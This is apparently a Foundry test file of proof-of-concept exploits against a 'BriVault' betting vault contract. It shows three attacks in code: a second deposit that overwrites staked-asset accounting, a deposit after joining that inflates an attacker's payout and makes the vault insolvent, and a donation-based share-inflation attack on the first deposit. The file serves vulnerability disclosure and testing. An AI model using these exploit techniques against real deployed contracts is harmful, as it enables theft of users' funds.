// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";

contract DuoLaSafePoC is Test {
    BriVault public vault;
    MockERC20 public token;

    uint256 participationFeeBsp = 150; // 1.5%
    uint256 minimumAmount = 0.0002 ether;
    address feeAddr = makeAddr("feeAddr");
    address owner = makeAddr("owner");

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");
    address u1 = makeAddr("u1");
    address u2 = makeAddr("u2");

    uint256 eventStart;
    uint256 eventEnd;

    string[48] countries;

    function setUp() public {
        eventStart = block.timestamp + 2 days;
        eventEnd = eventStart + 31 days;

        for (uint256 i = 0; i < 48; ++i) {
            countries[i] = string(abi.encodePacked("C", vm.toString(i)));
        }

        token = new MockERC20("Mock", "MTK");
        token.mint(attacker, 100 ether);
        token.mint(victim, 100 ether);
        token.mint(u1, 100 ether);
        token.mint(u2, 100 ether);

        vm.prank(owner);
        vault = new BriVault(
            IERC20(address(token)),
            participationFeeBsp,
            eventStart,
            feeAddr,
            minimumAmount,
            eventEnd
        );

        vm.prank(owner);
        vault.setCountry(countries);
    }

    // ------------------------------------------------------------------
    // PoC 1 (CRITICAL): cancelParticipation refunds the gross-of-fee
    // amount it never received, and a re-deposit overwrites stakedAsset.
    // We show: deposit twice -> stakedAsset only reflects the LAST deposit
    // (first stake is silently lost), AND cancel burns ALL shares while
    // refunding only the last stake => permanent loss of the user's funds,
    // while the contract keeps the difference. Then a different attacker
    // can drain that residual via the broken share math at withdraw.
    // Concretely here: a single user who deposits twice loses the first
    // deposit's principal forever.
    // ------------------------------------------------------------------
    function test_PoC1_doubleDeposit_loses_first_stake() public {
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);

        // First deposit of 10 ether
        vault.deposit(10 ether, victim);
        uint256 stakeAfter1 = vault.stakedAsset(victim);

        // Second deposit of 1 ether (e.g. topping up)
        vault.deposit(1 ether, victim);
        uint256 stakeAfter2 = vault.stakedAsset(victim);
        vm.stopPrank();

        console.log("stakedAsset after 1st deposit:", stakeAfter1);
        console.log("stakedAsset after 2nd deposit:", stakeAfter2);

        // The accounting was OVERWRITTEN, not accumulated:
        // after two deposits totalling 11 ether, stakedAsset only credits ~1 ether.
        assertLt(stakeAfter2, stakeAfter1, "stakedAsset overwritten by 2nd deposit");

        // Now victim cancels: they get back only stakedAsset (the LAST value),
        // but ALL their shares are burned and ALL principal was transferred in.
        uint256 balBefore = token.balanceOf(victim);
        vm.prank(victim);
        vault.cancelParticipation();
        uint256 refunded = token.balanceOf(victim) - balBefore;

        console.log("principal sent in (net of fee, both deposits):", uint256(10 ether + 1 ether) * (10000 - 150) / 10000);
        console.log("refunded on cancel:", refunded);

        // Refund is only ~1 ether of stake, even though ~10.835 ether of
        // principal entered the vault. The rest is permanently stranded.
        assertEq(refunded, stakeAfter2, "refund equals only the overwritten last stake");
        assertLt(refunded, 2 ether, "refund far below ~10.8 ether actually deposited");

        // Funds the victim lost are stuck in the vault:
        uint256 stranded = token.balanceOf(address(vault));
        console.log("victim funds stranded in vault:", stranded);
        assertGt(stranded, 9 ether, "victim principal stranded");
    }

    // ------------------------------------------------------------------
    // PoC 2 (CRITICAL): withdraw() pays out based on balanceOf(msg.sender)
    // and finalizedVaultAsset (= TOTAL vault incl. losers) divided by
    // totalWinnerShares. A user can inflate their own balanceOf relative
    // to totalWinnerShares by depositing AGAIN after joining the event,
    // because joinEvent snapshots totalWinnerShares but later deposits
    // mint extra shares to the same account that withdraw() still counts.
    // ------------------------------------------------------------------
    function test_PoC2_postJoin_deposit_inflates_payout() public {
        // Honest winner u1
        vm.startPrank(u1);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10 ether, u1);
        vault.joinEvent(5); // bets country 5 (the eventual winner)
        vm.stopPrank();

        // Attacker bets winning country too, then deposits AGAIN after joining
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10 ether, attacker);
        vault.joinEvent(5); // snapshot: attacker shares recorded into totalWinnerShares
        // Now deposit AGAIN -> mints extra shares to attacker, but
        // totalWinnerShares already snapshotted only the pre-topup amount.
        vault.deposit(10 ether, attacker);
        vm.stopPrank();

        // A loser to fund the pot
        vm.startPrank(u2);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10 ether, u2);
        vault.joinEvent(7); // losing country
        vm.stopPrank();

        // End event, set winner = country 5
        vm.warp(eventEnd + 1);
        vm.prank(owner);
        vault.setWinner(5);

        uint256 totalWinnerShares = vault.totalWinnerShares();
        console.log("totalWinnerShares (snapshot):", totalWinnerShares);
        console.log("attacker balanceOf (incl. post-join topup):", vault.balanceOf(attacker));
        console.log("u1 balanceOf:", vault.balanceOf(u1));

        uint256 finalized = vault.finalizedVaultAsset();
        console.log("finalizedVaultAsset:", finalized);

        // Attacker withdraws first using inflated balanceOf
        uint256 atkBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        vault.withdraw();
        uint256 atkGain = token.balanceOf(attacker) - atkBefore;
        console.log("attacker withdrew:", atkGain);

        // Attacker net invested 30 ether (3x10) net-of-fee ~29.55, but the
        // KEY exploit: payout uses balanceOf/totalWinnerShares where
        // totalWinnerShares EXCLUDES the topup shares -> share price > 1,
        // letting attacker pull more than their fair pro-rata of the pot
        // and breaking solvency for the honest winner u1.
        uint256 atkInvestedNet = uint256(30 ether) * (10000 - 150) / 10000;
        console.log("attacker net invested:", atkInvestedNet);

        // Now honest winner u1 tries to withdraw -> should fail / be starved
        uint256 vaultBalNow = token.balanceOf(address(vault));
        console.log("vault balance remaining for u1:", vaultBalNow);

        uint256 u1Shares = vault.balanceOf(u1);
        uint256 u1Owed = (u1Shares * finalized) / totalWinnerShares;
        console.log("u1 owed by formula:", u1Owed);

        // Insolvency: remaining vault balance < what u1 is owed by the formula
        assertLt(vaultBalNow, u1Owed, "vault cannot pay honest winner u1: insolvent");

        vm.prank(u1);
        vm.expectRevert(); // SafeERC20 transfer fails: not enough balance
        vault.withdraw();
    }
}

contract DuoLaSafePoC3 is Test {
    BriVault vault; MockERC20 token;
    address owner = makeAddr("owner"); address feeAddr = makeAddr("feeAddr");
    address atk = makeAddr("atk"); address vic = makeAddr("vic");
    uint256 start; uint256 end; string[48] c;
    function setUp() public {
        start = block.timestamp + 2 days; end = start + 31 days;
        for (uint256 i;i<48;++i) c[i]=string(abi.encodePacked("C",vm.toString(i)));
        token = new MockERC20("M","M");
        token.mint(atk,100 ether); token.mint(vic,100 ether);
        vm.prank(owner);
        vault = new BriVault(IERC20(address(token)),150,start,feeAddr,0.0002 ether,end);
        vm.prank(owner); vault.setCountry(c);
    }
    // Inflation: attacker deposits dust, donates tokens to vault to skew
    // _convertToShares so victim's later deposit mints ~0 shares.
    function test_PoC3_firstDepositInflation() public {
        vm.startPrank(atk);
        token.approve(address(vault),type(uint256).max);
        vault.deposit(0.001 ether, atk); // tiny first deposit -> ~0.000985e18 shares 1:1
        // donate directly to inflate balanceOfVault
        token.transfer(address(vault), 10 ether);
        vm.stopPrank();
        console.log("atk shares:", vault.balanceOf(atk));
        console.log("vault bal:", token.balanceOf(address(vault)));
        vm.startPrank(vic);
        token.approve(address(vault),type(uint256).max);
        uint256 vicShares = vault.deposit(5 ether, vic);
        vm.stopPrank();
        console.log("victim shares for 5 ether:", vicShares);
    }
}
